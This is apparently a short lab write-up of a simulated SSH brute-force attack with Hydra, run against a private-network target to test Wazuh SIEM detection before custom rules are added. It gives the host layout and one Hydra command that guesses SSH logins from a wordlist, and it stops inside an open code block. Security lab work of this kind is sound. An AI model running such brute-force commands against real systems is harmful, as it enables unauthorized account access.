# 🔐 SSH Bruteforce Simulation (Hydra) - Before Custom Rules

## 📅 Date
April 26, 2026

## 🖥️ Lab Environment

| Host | Role | IP Address |
|------|------|-------------|
| Kali Linux | Attacker | `192.168.1.29` |
| Target Server | Victim | `192.168.1.24` |
| Wazuh Manager | SIEM | `192.168.1.18` |

## ⚔️ Attack Execution

### Command
```bash
hydra -L wordlist.txt -P wordlist.txt 192.168.1.24 ssh -V
